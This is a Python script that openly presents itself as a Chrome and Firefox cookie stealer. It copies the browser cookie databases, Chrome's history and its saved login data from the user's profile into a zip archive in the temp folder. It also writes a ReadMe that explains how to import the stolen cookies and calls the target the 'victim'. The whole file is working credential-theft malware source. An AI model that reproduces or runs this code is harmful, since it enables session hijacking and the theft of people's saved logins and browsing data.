import os, shutil, tempfile

class GetCookies:
    def start(self):
        """
        Chrome & Firefox Cookies Stealer, Saves the Cookies.zip in TEMP
        """
        tempdir = tempfile.gettempdir()
        
        os.chdir(tempdir)
        try:
            shutil.rmtree("Cookies")
        except:
            pass
        os.system("md Cookies Cookies\\Chrome Cookies\\Firefox")

        chrome_cookiepath = os.environ.get('HOMEDRIVE') + os.environ.get('HOMEPATH') + '\\AppData\\Local\\Google\\Chrome\\User Data\\Default'
        chrome_destinationPath = tempdir + "\\Cookies\\Chrome"
        
        firefox_cookiepath = os.environ.get('HOMEDRIVE') + os.environ.get('HOMEPATH') + '\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\q1dyz51w.default\\cookies.sqlite'
        firefox_destinationPath = tempdir + "\\Cookies\\Firefox"

        cookie = chrome_cookiepath + "\\Cookies"
        history = chrome_cookiepath + "\\History"
        loginData = chrome_cookiepath + "\\Login Data"

        if os.path.exists(chrome_cookiepath):
            shutil.copy2(cookie, chrome_destinationPath)
            shutil.copy2(history, chrome_destinationPath)
            shutil.copy2(loginData, chrome_destinationPath)
            
        if os.path.exists(firefox_cookiepath):
            shutil.copy2(firefox_cookiepath, firefox_destinationPath)   
        
        with open("Cookies/ReadMe.txt" , "w") as f:
            f.write("In Order To Import These Cookies, Just Copy & Paste Them At This Path: \n\n[For Chrome]\nC:/Users/USERNAME/AppData/Local/Google/Chrome/User Data/Default/\n\n[For Firefox]\nC:/Users/USERNAME/AppData/Roaming/Mozilla/Firefox/Profiles/q1dyz51w.default/\n\n[Note]\nIf Cookies are not found in there respective folders that means that, that particular browser is not installed on victim's PC")

        shutil.make_archive("Cookies", "zip", "Cookies")    
        shutil.rmtree("Cookies")
        
        cookie_zip_path = tempdir + "\\Cookies.zip"
        
        return cookie_zip_path
        
if __name__ == '__main__':
    test = GetCookies()
    result = test.start()
    print(result)
